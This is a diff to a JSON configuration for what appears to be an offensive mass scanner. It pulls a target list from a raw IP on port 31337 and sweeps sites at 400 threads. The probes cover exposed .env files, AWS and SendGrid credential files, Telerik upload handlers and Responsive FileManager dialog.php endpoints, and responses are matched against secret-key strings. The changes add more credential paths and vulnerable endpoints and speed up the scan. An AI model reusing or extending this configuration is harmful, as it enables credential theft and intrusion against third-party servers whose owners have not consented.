@@ -3,7 +3,7 @@
   "statuscode": [
     200
   ],
-  "inputUrl": "http:/103.191.50.59:31337/jdom/tele/get.php",
+  "inputUrl": "http:/103.191.50.59:31337/jdom/get.php",
   "threads": 400,
   "timeout": 8,
   "paths": [
@@ -11,6 +11,13 @@
     "/Telerik.Web.UI.WebResource.axd?type=rau",
     "/.docker/laravel/app/.env",
     "/aws_credentials",
+    "/.aws/credentials",
+    "sendgrid.env",
+    "/assets/filemanager/dialog.php",
+    "/assets/plugins/filemanager/dialog.php",
+    "/assets/admin/js/tinymce/plugins/filemanager/dialog.php",
+    "/filemanager/dialog.php",
+    "/admin/filemanager/dialog.php",
     "/.env",
     "/.env/backup",
     "/.env/dist",
@@ -35,6 +42,7 @@
     "/en/.env",
     "/exapi/.env",
     "/lab/.env",
+    "/assets/lib/sendgrid/sendgrid.env",
     "/laravel/.env",
     "/lib/.env",
     "/psnlink/.env",
@@ -201,11 +209,13 @@
     "userPassword",
     "aws_access_key_id",
     "serverHost",
+    "Responsive FileManager",
     "aws_secret_access_key",
     "RadAsyncUpload",
     "Deploy to production prod",
     "role_arn = arn:aws:iam",
     "sftp_password",
+    "export SENDGRID_API_KEY",
     "ssh_password",
     "\"secretKey\":",
     "ADMIN_PASSWORD",
@@ -213,5 +223,5 @@
   ],
   "regex": [],
   "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
-  "iterationDelay": 6000
+  "iterationDelay": 3500
 }
